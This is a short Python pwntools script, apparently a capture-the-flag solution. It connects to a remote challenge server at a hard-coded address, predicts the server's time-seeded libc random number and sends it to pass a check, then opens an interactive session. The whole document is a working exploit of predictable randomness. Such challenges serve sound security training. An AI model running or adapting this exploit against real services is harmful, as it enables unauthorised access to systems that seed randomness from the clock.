from pwn import *
import ctypes

REMOTE = True

HOST = '3.34.91.236'
PORT = 20003
FD_MX = 65536

if REMOTE:
    io = remote(HOST, PORT)
else:
	io = process('./deploy/main')

libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))
fd = (libc.rand() % (FD_MX - 5 + 1)) + 5;

io.sendlineafter('> ', str(fd))

io.success(io.recv())

io.interactive()
